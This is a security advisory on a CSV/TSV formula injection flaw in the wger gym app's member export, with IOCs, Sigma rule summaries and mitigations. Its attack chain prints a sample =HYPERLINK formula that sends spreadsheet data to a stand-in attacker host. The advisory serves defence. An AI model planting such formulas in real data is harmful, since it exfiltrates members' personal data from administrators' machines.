---
title: wger CSV/TSV Formula Injection Vulnerability
slug: 2024-01-wger-csv-injection
description: A CSV/TSV injection vulnerability exists in wger <= 2.5, allowing malicious gym members to inject spreadsheet formulas into their profiles, which are then executed when an administrator exports and opens the member list, potentially leading to data exfiltration and remote code execution.
date: "2024-01-03T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - csv-injection
  - formula-injection
  - web-application
  - data-exfiltration
vendors:
  - wger
products:
  - wger (<= 2.5)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1204
    technique_name: User Execution
references:
  - https://github.com/advisories/GHSA-xq9m-hmp9-fw87
iocs:
  - type: url
    value: http://attacker.example/x?p=
  - type: domain
    value: attacker.example
  - type: email
    value: alice@test.local
ioc_counts:
  domain: 1
  email: 1
  url: 1
rules:
  - title: wger CSV Injection - Export Activity
    description: Detects attempts to export user data from wger while a malicious formula is present in the database, indicating potential CSV injection exploitation.
    platform: sigma
    severity: high
    tactics:
      - initial_access
    techniques:
      - T1204.002
    data_sources:
      - webserver
      - linux
  - title: wger CSV Injection - Profile Update with Formula
    description: Detects profile updates containing spreadsheet formula prefixes (=, +, -, @) which may indicate an attempt to inject malicious code.
    platform: sigma
    severity: medium
    tactics:
      - initial_access
    techniques:
      - T1204.002
    data_sources:
      - webserver
      - linux
rules_count: 2
---

wger, a web-based workout and gym management application, is vulnerable to CSV/TSV formula injection. This flaw stems from the application's failure to sanitize user-supplied `first_name` and `last_name` fields when exporting gym member data to TSV format. A malicious gym member can inject spreadsheet formulas (e.g., using `=HYPERLINK`) into their profile, which are then stored in the database. When a gym administrator exports the member list using the affected endpoint (`/en/gym/export/users/<gym_pk>`) and opens the TSV file in a spreadsheet application like Excel or LibreOffice Calc, the injected formula executes within the administrator's local context, potentially enabling data exfiltration or even arbitrary code execution on older Excel versions with Dynamic Data Exchange (DDE) enabled. This vulnerability affects wger versions 2.5 and earlier, and poses a significant risk to organizations using wger to manage sensitive gym member data.

## Attack Chain

1.  A malicious gym member registers or modifies their profile via the profile edit endpoint.
2.  The attacker injects a malicious formula (e.g., `=HYPERLINK("http://attacker.example/?p="&A1,"click")`) into the `first_name` or `last_name` field.
3.  The wger application stores the unsanitized formula in the database.
4.  A gym administrator with `manage_gym` permission initiates a member list export via `GET /en/gym/export/users/<gym_pk>`.
5.  The server generates a TSV file containing the injected formula in the corresponding user's `first_name` or `last_name` field.
6.  The administrator downloads the TSV file.
7.  The administrator opens the TSV file using a spreadsheet application (e.g., Excel, LibreOffice Calc).
8.  The spreadsheet application executes the injected formula, potentially exfiltrating data to `attacker.example` or, with DDE enabled, executing arbitrary commands on the administrator's workstation.

## Impact

Successful exploitation of this vulnerability can have severe consequences. An attacker could exfiltrate sensitive data, including other members' email addresses, phone numbers, and other PII visible in the spreadsheet. In older versions of Excel with DDE enabled, the attacker could achieve arbitrary code execution on the administrator's workstation. This could lead to complete system compromise, allowing the attacker to install malware, steal credentials, or perform other malicious activities. Since this can occur every time the administrator performs a member export, the vulnerability poses a persistent risk.

## Recommendation

*   Deploy the `wger-csv-injection-export` Sigma rule to detect when a gym administrator exports user data while a malicious formula is present in the database.
*   Deploy the `wger-csv-injection-profile-update` Sigma rule to detect suspicious profile updates containing formula prefixes.
*   Apply the vendor-supplied patch, which implements formula prefix sanitization, as detailed in the advisory.
*   Educate administrators about the risks of opening untrusted TSV/CSV files in spreadsheet applications.
*   Disable DDE in legacy Excel installations to prevent potential remote code execution.
*   Monitor network traffic for outbound connections to suspicious domains, as exfiltration may occur via the HYPERLINK or WEBSERVICE functions. Block the `attacker.example` domain at the DNS resolver if observed.
